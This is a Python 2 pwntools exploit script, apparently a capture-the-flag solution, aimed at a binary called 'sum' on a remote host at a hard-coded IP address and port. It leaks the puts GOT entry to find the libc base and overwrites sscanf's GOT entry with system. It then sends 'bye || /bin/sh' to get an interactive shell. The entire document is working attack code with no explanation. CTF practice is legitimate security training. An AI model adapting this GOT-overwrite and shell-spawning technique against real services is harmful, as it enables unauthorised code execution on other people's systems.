#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('sum')

host = args.HOST or '35.207.132.47'
port = int(args.PORT or 22226)

env = {'LD_PRELOAD':'./libc-2.27.so'}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env = env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env = env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
set environment LD_PRELOAD ./libc-2.27.so
break *0x400B41
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.sendlineafter('>', '-1')
log.info("puts@got: {}".format(hex(exe.got['puts'])))
io.sendlineafter('>', 'get {}'.format(exe.got['puts'] / 8))
io.recvuntil('bye')
io.recvuntil('bye')
io.recvuntil('> ')

libc = ELF(env['LD_PRELOAD'])
addr = int(io.recvline().strip())
libc.address = addr - libc.symbols['puts']
log.success('libc addr: {}'.format(hex(libc.address)))

io.sendlineafter('>', 'set {} {}'.format(exe.got['__isoc99_sscanf'] / 8, libc.symbols['system']))
io.sendlineafter('>', 'bye || /bin/sh')

io.interactive()

